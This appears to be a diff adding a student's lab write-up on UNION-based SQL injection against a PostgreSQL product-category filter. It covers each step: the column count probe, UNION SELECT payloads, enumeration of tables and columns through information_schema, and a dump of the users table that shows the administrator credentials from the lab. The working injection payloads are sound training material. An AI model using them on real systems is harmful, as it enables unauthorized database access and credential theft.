@@ -1,0 +1,112 @@
+Lab - SQL injection attack, listing the database contents on non-Oracle databases
+
+Vulnerable feature - Product category filter
+
+Goal - determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+Log in as the administrator user
+
+Analysis:
+The results from te query are returned in the app's response -> can use UNION attack to retrieve
+data from other tables.
+
+1. Determine the No of columns returned by the query
+Corporate gifts'ORDER BY 3--
+-> There are 2 cols 
+
+2. Find the col that contain text
+Corporate gifts'UNION SELECT 'a', 'a'--
+--> both column are of data type string
+
+3. Determine the name of this table
+Pets'UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
+
+pg_partitioned_table -----------------> PostgresSQL
+pg_available_extension_versions
+pg_shdescription
+user_defined_types
+udt_privileges
+sql_packages
+pg_event_trigger
+pg_amop
+schemata
+routines
+referential_constraints
+administrable_role_authorizations
+products
+pg_foreign_data_wrapper
+pg_prepared_statements
+pg_largeobject_metadata
+foreign_tables
+sql_implementation_info
+collation_character_set_applicability
+check_constraint_routine_usage
+pg_statio_user_sequences
+pg_cast
+pg_user_mappings
+pg_statio_all_tables
+pg_stat_progress_vacuum
+users_mcdzij              -------------> table we need
+pg_statio_sys_sequences
+pg_inherits
+pg_stat_xact_all_tables
+column_options
+foreign_servers
+sql_features
+pg_stat_wal_receiver
+pg_pltemplate
+constraint_table_usage
+pg_ts_parser
+parameters
+pg_stat_activity
+pg_ts_template
+element_types
+pg_stat_subscription
+pg_stat_all_tables
+pg_locks
+pg_seclabel
+pg_ts_config
+pg_stat_archiver
+pg_stat_ssl
+role_udt_grants
+pg_stat_xact_user_functions
+pg_am
+domain_udt_usage
+column_privileges
+pg_policy
+pg_timezone_names
+domains
+pg_amproc
+pg_replication_origin
+information_schema_catalog_name
+pg_ts_dict
+character_sets
+pg_db_role_setting
+pg_publication
+pg_stat_xact_sys_tables
+foreign_data_wrappers
+routine_privileges
+pg_views
+pg_foreign_table
+pg_statio_sys_indexes
+pg_database
+user_mappings
+pg_class
+pg_foreign_server
+pg_type
+
+Tried-
+Pets'UNION SELECT NULL, Column_name FROM information_schema.columns where table_name ='users_mcdzij'--
+Only return 1 row (actually all rows, whoops)
+
+Pets'UNION SELECT column_name, null FROM information_schema.columns--
+--> See all column name of all tables
+
+Pets'UNION SELECT column_name, column_name FROM information_schema.columns where table_name='users_mcdzij'--
+Returns 2 rows (all rows actually)
+username_hfccpb
+password_pevnaq
+
+
+Pets'UNION SELECT username_hfccpb, password_pevnaq FROM users_mcdzij--
+administrator
+brtjo56yc20o216c3nax
